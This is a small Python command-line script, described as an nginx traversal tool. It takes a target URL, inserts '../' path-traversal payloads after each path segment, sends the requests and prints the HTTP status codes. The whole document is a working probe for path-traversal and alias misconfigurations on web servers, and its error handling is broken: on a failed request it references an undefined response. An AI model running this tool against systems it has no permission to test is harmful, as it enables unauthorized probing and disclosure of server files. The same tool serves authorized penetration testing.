try:
    from urllib.parse import urlparse
except ImportError:
     from urlparse import urlparse
import sys
import argparse as ag
import requests as rq

argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
argparser.add_argument("url", type=str, help="URL of the target")
argparser.add_argument("-v", help="increase verbosity", action="store_true", dest="verbose")
argparser.add_argument("-a", help="append segment in the end", action="store_true")

args = argparser.parse_args()

payloads = ["../", "../../", "../../../../../../../../../../../"]

def make_a_request (url):
    try:
        resp = rq.get(url, verify=True)
    except Exception as e:
        resp.status_code = 500
    return str(resp.status_code)

def main():
    parser = urlparse(args.url)
    path = parser.path

    segments = path.split("/")
    segments = segments[1: len(segments)]

    _str = ""
    _marks = ('-'*80)
    sys.stdout.write("\n{0:50}\t{1}\n{2}\n".format("URL", "Status",_marks))
    for segment in segments:
        _str += "/"+segment
        if(args.a): _x = segment
        else:
            _x = ""
        for payload in payloads:
            _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
            sys.stdout.write("{0} \033[92m[{1}]\033[00m\n".format(_url, make_a_request(_url)))

    for i in range(0, len(segments)-1):
        for payload in payloads:
            _url = parser.scheme+"://"+parser.netloc+"/" + '/'.join(segments[0:i+1]) + payload + '/'.join(segments[i+1:len(segments)])
            sys.stdout.write("{} \033[92m[{}]\033[00m\n".format(_url, make_a_request(_url)))




if __name__ == '__main__':
    main()
